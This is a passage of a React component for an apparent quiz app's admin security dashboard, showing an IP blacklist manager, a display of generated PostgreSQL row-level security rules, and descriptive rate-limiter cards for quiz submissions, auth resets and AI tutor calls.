                  <li className="flex items-center gap-1.5 text-emerald-400">✓ Edit/Delete SSS Question Banks</li>
                  <li className="flex items-center gap-1.5 text-emerald-400">✓ Compile bulk questions via Gemini AI</li>
                  <li className="flex items-center gap-1.5 text-emerald-400">✓ Inspect comprehensive security IDS logs</li>
                  <li className="flex items-center gap-1.5 text-emerald-400">✓ Manage the Sandbox Active IP blacklist</li>
                </ul>
              </div>

            </div>
          ) : (
            <div className="space-y-4">
              <p className="text-xs text-slate-500 leading-normal">
                To guarantee absolute horizontal partition separation, copy our compiled PostgreSQL Row Level Security rules directly into your production Supabase, Cockroach, or relational PostgreSQL instance:
              </p>
              <div className="bg-slate-900 text-slate-300 p-4 rounded-2xl font-mono text-[10px] space-y-1 overflow-x-auto">
                <pre>{compileRowLevelSecurityRules()}</pre>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* DOCK BLACKLIST IP MANAGER PANEL */}
      <div className="bg-white border border-slate-150 rounded-3xl p-6 shadow-sm font-sans">
        
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-indigo-50">
          <div>
            <h3 className="font-display font-black text-slate-950 text-xs sm:text-sm flex items-center gap-2">
              <Ban className="w-4.5 h-4.5 text-red-500" /> Active Firewalled IP Blacklist & Rate Limiters
            </h3>
            <p className="text-[10px] text-slate-500">Temporarily or permanently blocked addresses flagged for flooding or cheating</p>
          </div>

          <form onSubmit={blockIpAddress} className="flex gap-2">
            <input
              type="text"
              required
              value={newIpToBlock}
              onChange={(e) => setNewIpToBlock(e.target.value)}
              placeholder="e.g. 197.12.92.115"
              className="px-3 py-1.5 text-xs font-mono border border-slate-200 rounded-xl bg-slate-50 focus:outline-hidden"
            />
            <button
              type="submit"
              className="py-1.5 px-4 bg-red-650 hover:bg-red-700 text-white font-extrabold text-xs rounded-xl shadow-xs transition shrink-0 cursor-pointer border-0"
            >
              Add Malicious IP to WAF Block
            </button>
          </form>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mt-6">
          <div className="space-y-4">
            <h5 className="font-black text-slate-900 text-xs flex items-center gap-1.5">
              <span>🛑</span> Dynamic Firewalled Sandbox IPs List ({blockedIps.length})
            </h5>
            
            <div className="space-y-2">
              {blockedIps.map(ip => (
                <div key={ip} className="bg-slate-50 p-3 rounded-2xl border border-slate-100 flex items-center justify-between gap-2 transition hover:bg-red-50/20">
                  <div className="flex items-center gap-2.5">
                    <span className="w-2.5 h-2.5 bg-red-500 rounded-full"></span>
                    <span className="font-mono text-xs font-extrabold text-slate-700">{ip}</span>
                    <span className="text-[9px] bg-red-100 text-red-800 font-extrabold px-1.5 py-0.5 rounded-full uppercase">
                      Blacklisted
                    </span>
                  </div>
                  <button
                    onClick={() => removeBlockedIp(ip)}
                    className="text-xs text-indigo-600 hover:text-indigo-805 font-bold cursor-pointer"
                  >
                    Permit Entry (Unblock)
                  </button>
                </div>
              ))}
            </div>
          </div>

          <div className="space-y-4 bg-slate-50 p-5 rounded-2xl border border-slate-100">
            <h5 className="font-black text-indigo-950 text-xs flex items-center gap-1.5">
              <Key className="w-4 h-4 text-indigo-600" /> API Gateway Distributed Rate Limiter Configurations
            </h5>
            
            <div className="space-y-3 text-xs font-medium">
              <div className="p-3 border border-slate-200/50 bg-white rounded-xl space-y-1.5 shadow-3xs">
                <div className="flex items-center justify-between font-extrabold">
                  <span className="text-slate-800">CBT Quiz Submissions:</span>
                  <span className="text-indigo-600 bg-indigo-50 px-2 py-0.5 rounded-full text-[9px] font-black uppercase">
                    60 Req / Min
                  </span>
                </div>
                <p className="text-[10px] text-slate-500 leading-snug">Distributed sliding window bucket limit prevents automatic submission solver abuse.</p>
              </div>

              <div className="p-3 border border-slate-200/50 bg-white rounded-xl space-y-1.5 shadow-3xs">
                <div className="flex items-center justify-between font-extrabold">
                  <span className="text-slate-800">Auth Token Verification / Reset:</span>
                  <span className="text-indigo-600 bg-indigo-50 px-2 py-0.5 rounded-full text-[9px] font-black uppercase">
                    5 Req / Min
                  </span>
                </div>
                <p className="text-[10px] text-slate-500 leading-snug">Locks down brute force dictionary login attacks automatically upon threshold violation.</p>
              </div>

              <div className="p-3 border border-slate-200/50 bg-white rounded-xl space-y-1.5 shadow-3xs">
                <div className="flex items-center justify-between font-extrabold">
                  <span className="text-slate-800">AI Tutor Coach Invocations:</span>
                  <span className="text-indigo-600 bg-indigo-50 px-2 py-0.5 rounded-full text-[9px] font-black uppercase">
                    15 Req / Min
                  </span>
                </div>
                <p className="text-[10px] text-slate-500 leading-snug">Protects Gemini API limits from massive scraper scripts and account multi-tab session flooding.</p>
              </div>
            </div>
          </div>
        </div>

      </div>

    </div>
  );
}
